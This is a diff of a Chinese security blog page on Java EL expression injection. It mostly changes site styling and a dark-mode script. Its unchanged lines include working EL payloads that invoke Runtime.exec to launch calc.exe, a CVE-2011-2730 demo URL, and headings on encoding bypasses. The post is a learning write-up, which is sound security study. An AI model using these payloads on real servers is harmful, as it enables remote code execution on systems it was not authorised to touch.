@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>EL表达式注入 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/03/25/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="https://curlysean.github.io/2025/03/25/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-03-25T03:14:38.000Z">2025.03.25</time></div>
-      <div><span>更新</span><time datetime="2025-03-25T03:14:38.000Z">2025.03.25</time></div>
-      <div><span>阅读</span><strong>15 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LcMib"><span class="toc-text"> EL表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hKZSz"><span class="toc-text">前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lmwyA"><span class="toc-text">EL表达式漏洞注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#H87dn"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w7Oa7"><span class="toc-text">通用的Poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciMuc"><span class="toc-text">简单的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E4%B9%8B-CVE-2011-2730"><span class="toc-text">简单漏洞场景CVE-2011-2730</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IdSDB"><span class="toc-text">EL表达式的EXP与基础绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XsqTV"><span class="toc-text">基础EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pqy5s"><span class="toc-text">利用 ScriptEngine 调用 JS 引擎绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BYc3S"><span class="toc-text">利用 Unicode 编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QLpyH"><span class="toc-text">利用八进制编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OILfV"><span class="toc-text">防御方法</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hKZSz"><span class="toc-text">前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lmwyA"><span class="toc-text">EL表达式漏洞注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#H87dn"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w7Oa7"><span class="toc-text">通用的Poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciMuc"><span class="toc-text">简单的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E4%B9%8B-CVE-2011-2730"><span class="toc-text">简单漏洞场景CVE-2011-2730</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IdSDB"><span class="toc-text">EL表达式的EXP与基础绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XsqTV"><span class="toc-text">基础EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pqy5s"><span class="toc-text">利用 ScriptEngine 调用 JS 引擎绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BYc3S"><span class="toc-text">利用 Unicode 编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QLpyH"><span class="toc-text">利用八进制编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OILfV"><span class="toc-text">防御方法</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-03-25T03:14:38.000Z">2025.03.25</time></div>
+        <div><span>更新</span><time datetime="2025-03-25T03:14:38.000Z">2025.03.25</time></div>
+        <div><span>阅读</span><strong>约 6 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="LcMib"> EL表达式注入</h1>
+        
 
 <p>今天来学习<strong>EL表达式注入</strong></p>
 <h2 id="hKZSz">前置基础</h2>
@@ -158,7 +179,7 @@ EL（全称 Expression Language）表达式语言
 </ul>
 <p>EL表达式获取数据时，依次从以上四个域中获取，直到寻找到该变量（若没有找到则返回<code>&quot;&quot;</code>）</p>
 <p>有些双亲委派的味道</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png" alt="EL表达式注入" loading="lazy"></p>
 <h2 id="lmwyA">EL表达式漏洞注入</h2>
 <h3 id="H87dn">漏洞原理</h3>
 
@@ -173,9 +194,9 @@ EL（全称 Expression Language）表达式语言
 <p>我们将参数<code>X</code>设为以下payload</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png" alt="EL表达式注入" loading="lazy"></p>
 <p>当我们访问JSP页面时，服务端就会解析构造的恶意EL表达式，从而造成EL表达式注入</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png" alt="EL表达式注入" loading="lazy"></p>
 <p>在实际的应用场景中，几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而且目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的</p>
 <h4 id="简单漏洞场景之-CVE-2011-2730">简单漏洞场景CVE-2011-2730</h4>
 参考链接：[https://juejin.cn/post/6844903572077838350](https://juejin.cn/post/6844903572077838350)
@@ -187,7 +208,7 @@ EL（全称 Expression Language）表达式语言
 <p>我们改变EL表达式的内容，就可以达到其他目的</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/tag.jsp?a=$&#123;applicationScope&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png" alt="EL表达式注入" loading="lazy"></p>
 <h2 id="IdSDB">EL表达式的EXP与基础绕过</h2>
 <h3 id="XsqTV">基础EXP</h3>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;&#x27;</span>.getClass()).invoke(<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>),<span class="string">&#x27;calc.exe&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
@@ -240,13 +261,13 @@ EL（全称 Expression Language）表达式语言
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/03/29/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>SPEL表达式注入</strong>
       </a>
     
     
-      <a href="/2025/03/25/Valve%E5%86%85%E5%AD%98%E9%A9%AC/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/03/25/Valve%E5%86%85%E5%AD%98%E9%A9%AC/">
+        <span>更早一篇</span>
         <strong>Valve内存马</strong>
       </a>
     
@@ -260,9 +281,9 @@ EL（全称 Expression Language）表达式语言
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
